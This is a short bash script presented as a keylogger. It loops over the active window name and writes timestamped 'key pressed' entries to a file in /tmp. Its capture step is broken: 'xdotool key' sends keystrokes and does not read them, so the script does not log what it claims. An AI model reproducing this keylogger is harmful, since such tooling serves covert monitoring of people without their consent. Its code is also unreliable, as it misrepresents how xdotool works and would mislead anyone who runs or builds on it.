#!/bin/bash
LOG_FILE="/tmp/keypress_log.txt"

echo "Starting keypress logging..." > $LOG_FILE

# Loop to continuously capture keypress events
while true; do
    ACTIVE_WINDOW=$(xdotool getactivewindow getwindowname 2>/dev/null)
    
    if [[ ! -z "$ACTIVE_WINDOW" ]]; then
        PRESSED_KEY=$(xdotool key)
        echo "$(date): Key pressed in $ACTIVE_WINDOW: $PRESSED_KEY" >> $LOG_FILE
    fi

    sleep 0.1  # Adjust logging speed if needed
done
